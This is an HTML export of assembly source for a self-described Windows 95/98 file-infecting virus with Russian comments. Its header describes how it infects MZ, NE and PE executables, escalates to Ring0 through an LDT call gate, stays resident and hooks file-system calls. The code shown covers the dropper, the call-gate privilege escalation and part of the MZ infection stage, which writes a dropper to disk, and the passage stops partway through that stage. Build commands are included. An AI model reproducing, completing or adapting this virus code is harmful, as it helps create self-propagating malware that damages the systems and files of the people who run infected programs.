<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc5">DEBUG</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; 1 - включить отладочный режим</span><span class="sc0">
        </span><span class="sc1">; 0 - выключить отладочный режим</span><span class="sc0">

</span><span class="sc1">; COMMENT %</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   MZ-EXE.NE-EXE.PE-EXE.R0-TSR. Infects MZ-EXE files by appending</span><span class="sc0">
</span><span class="sc1">;   to the end of file, NE-EXE by creating of new segment at the</span><span class="sc0">
</span><span class="sc1">;   end of file and PE-EXE by appending to the last section.</span><span class="sc0">
</span><span class="sc1">;   Operates under Windows95/98 only. At starting from MZ-EXE:</span><span class="sc0">
</span><span class="sc1">;   creating of temporary dropper, V86-&gt;PROT16 (by using of DPMI calls), </span><span class="sc0">
</span><span class="sc1">;   PROT16-&gt;PROT32R0 (by creating of callgate at the LDT).</span><span class="sc0">
</span><span class="sc1">;   At starting from NE-EXE: PROT16-&gt;PROT32R0. At starting from</span><span class="sc0">
</span><span class="sc1">;   PE-EXE: installing of SEH, PROT32R3-&gt;PROT32R0. When entered Ring0, </span><span class="sc0">
</span><span class="sc1">;   virus installs itself into system memory and hooks IFS.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;    Перед вами моя вторая попытка создания вируса для Windows95. Так получилось,</span><span class="sc0">
</span><span class="sc1">; что этот вирус выходит в свет раньше предыдущего (там нужно кое-что доделать),</span><span class="sc0">
</span><span class="sc1">; ну а этот продукт тоже будет потом дорабатываться. Вирус является в некотором</span><span class="sc0">
</span><span class="sc1">; роде мультиплатформенным. Он заражает MZ, NE и PE-EXE, но работоспособен только</span><span class="sc0">
</span><span class="sc1">; под Windows95/98. Заражение происходит при открытии файла. Обрабатываются файлы</span><span class="sc0">
</span><span class="sc1">; с атрибутом "ReadOnly". Атрибуты файла не изменяются. Заражение файлов:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  * MZ-EXE. Стандартным образом дописывается в конец файла и корректирует MZ-EXE</span><span class="sc0">
</span><span class="sc1">;    заголовок.</span><span class="sc0">
</span><span class="sc1">;  * NE-EXE. Добавляет в таблицу сегментов описание еще одного сегмента. Далее</span><span class="sc0">
</span><span class="sc1">;    корректирует NE-EXE заголовок и дописывается в конец файла.</span><span class="sc0">
</span><span class="sc1">;  * PE-EXE. Дописывается к последней секции и корректирует PE-EXE заголовок и</span><span class="sc0">
</span><span class="sc1">;    дескриптор последней секции.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Вирус резидентный. Установка в память осуществляется следующим образом:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  * PE-EXE. Обработчик исключений (SEH) устанавливается на вирус, чтобы не</span><span class="sc0">
</span><span class="sc1">;    допустить глюков под WindowsNT. В 1-ом дескрипторе LDT создается шлюз</span><span class="sc0">
</span><span class="sc1">;    вызова (CallGate), который указывает на процедуру Ring0. При вызове этого</span><span class="sc0">
</span><span class="sc1">;    CallGate процедура Ring0 получает управление с привелегиями нулевого</span><span class="sc0">
</span><span class="sc1">;    кольца. Эта процедура выделяет страницу памяти в области выше 2Gb, защищает</span><span class="sc0">
</span><span class="sc1">;    ее от чтения из 3-го кольца и копирует туда вирус. Затем перехватывыается</span><span class="sc0">
</span><span class="sc1">;    обработчик IFS и устанавливается обработчик порта 28h (чтобы определять</span><span class="sc0">
</span><span class="sc1">;    присутствие копии вируса в памяти). Далее происходит возврат в 3-е кольцо,</span><span class="sc0">
</span><span class="sc1">;    и управление отдается файлу-носителю.</span><span class="sc0">
</span><span class="sc1">;  * NE-EXE. То же самое, что и в PE-EXE, только шлюз вызова создается с помощью</span><span class="sc0">
</span><span class="sc1">;    DPMI-вызовов.</span><span class="sc0">
</span><span class="sc1">;  * MZ-EXE. На диск сбрасывается и запускается дроппер с вирусом, в начале</span><span class="sc0">
</span><span class="sc1">;    которого расположена процедура перехода в нулевое кольцо. Эта процедура</span><span class="sc0">
</span><span class="sc1">;    выполняет переход в защищенный режим. Далее все происходит так же, как в</span><span class="sc0">
</span><span class="sc1">;    NE-EXE. После этого дроппер удаляется с диска, а управление передается</span><span class="sc0">
</span><span class="sc1">;    программе-носителю.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                                   DJ Sadovnikov (http://i.am/djsad), 12.12.2000</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  ══════════════════════════════════════════════════════════════════════════════       </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                  Компилировать с помощью TASM 4.1+</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                     tasm /m winmulti.asm</span><span class="sc0">
</span><span class="sc1">;                     tlink /3 /x winmulti.obj</span><span class="sc0">
</span><span class="sc1">;                     del winmulti.obj</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                  Файлы из архива:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                     winmulti.asm 23000 (исходник вируса)</span><span class="sc0">
</span><span class="sc1">;                     winmulti.exe  2557 (бинарник вируса)</span><span class="sc0">
</span><span class="sc1">;                     winmulti.doc 10870 (техническая информация)</span><span class="sc0">
</span><span class="sc1">; %</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">


</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

        </span><span class="sc2">.386p</span><span class="sc0">
</span><span class="sc5">Code16</span><span class="sc0">      </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">use16</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Code16</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">Code16</span><span class="sc0">


</span><span class="sc5">Start</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Msg</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4C00h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">Msg</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Virus has started...$'</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">





















</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;                ДРОППЕР ДЛЯ ПЕРЕХОДА ИЗ V86 В RING0</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc1">;[Укорачиваем текущий блок памяти]</span><span class="sc0">

</span><span class="sc5">Start16</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Terminate</span><span class="sc0">


</span><span class="sc1">;[Получаем адрес DPMI]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1687h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Terminate</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">OfsDPMI</span><span class="sc4">-</span><span class="sc5">Start16</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">SegDPMI</span><span class="sc4">-</span><span class="sc5">Start16</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">


</span><span class="sc1">;[Выделяем память для данных DPMI]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Terminate</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">


</span><span class="sc1">;[Переходим в защищенный режим]</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">9Ah</span><span class="sc0">
</span><span class="sc5">OfsDPMI</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SegDPMI</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Terminate</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем вирус в память]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">EnterR0</span><span class="sc0">


</span><span class="sc1">;[Отдаем управление DOS]</span><span class="sc0">

</span><span class="sc5">Terminate</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4C00h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">





















</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;            ТРАНЗИТНАЯ ЧАСТЬ ДЛЯ ПЕРЕХОДА ИЗ PROT16 В PROT32</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">EnterR0</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Entry1</span><span class="sc0">
</span><span class="sc5">Entry1</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Entry1</span><span class="sc4">-</span><span class="sc5">Start16</span><span class="sc0">


</span><span class="sc1">;[Создаем дополнительный дескриптор]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">31h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">


</span><span class="sc1">;[Сохраняем в стеке размер и адрес GDT]</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">sgdt</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем новый размер сегмента DS]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">31h</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем сегмент DS на GDT]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">31h</span><span class="sc0">


</span><span class="sc1">;[Получаем адрес LDT]</span><span class="sc0">

        </span><span class="sc6">sldt</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11111000b</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc10">Error</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем сегмент DS на LDT]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">31h</span><span class="sc0">


</span><span class="sc1">;[Сохраняем первый дескриптор в LDT]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc1">;[Вычисляем линейный адрес метки Ring0]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">31h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[(</span><span class="sc5">Ring0</span><span class="sc4">-</span><span class="sc5">Start32</span><span class="sc4">)+(</span><span class="sc5">EndCode16</span><span class="sc4">-</span><span class="sc5">Start16</span><span class="sc4">)+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc1">;[Создаем в первом дескрипторе LDT шлюз вызова]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">11101100b</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">


</span><span class="sc1">;[Переходим в нулевое кольцо]</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">9Ah</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00000111b</span><span class="sc0">


</span><span class="sc1">;[Восстанавливаем первый дескриптор LDT]</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc1">;[Уничтожаем созданный ранее дополнительный дескриптор]</span><span class="sc0">

</span><span class="sc10">Error</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">31h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">





















</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;                     ТРАНЗИТНАЯ ЧАСТЬ ДЛЯ MZ-EXE</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">StartMZ</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Entry2</span><span class="sc0">
</span><span class="sc5">Entry2</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Entry2</span><span class="sc4">-</span><span class="sc5">Start16</span><span class="sc0">


</span><span class="sc1">;[Проверяем наличие вируса в памяти]</span><span class="sc0">

        </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ABCDh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">QuitMZ</span><span class="sc0">


</span><span class="sc1">;[Получаем версию Windows]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1600h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">QuitMZ</span><span class="sc0">


</span><span class="sc1">;[Укорачиваем текущий блок памяти]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2000h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ah</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">QuitMZ</span><span class="sc0">


</span><span class="sc1">;[Создаем файл для дроппера]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Ch</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FName</span><span class="sc4">-</span><span class="sc5">Start16</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">QuitMZ</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">


</span><span class="sc1">;[Записываем в него код вируса]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">QuitMZ</span><span class="sc0">


</span><span class="sc1">;[Закрываем файл]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">QuitMZ</span><span class="sc0">


</span><span class="sc1">;[Подготавливаем блок параметров для запуска дроппера]</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PBlock</span><span class="sc4">-</span><span class="sc5">Start16</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">


</span><span class="sc1">;[Запускаем дроппер]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4B00h</span><span class="sc0">
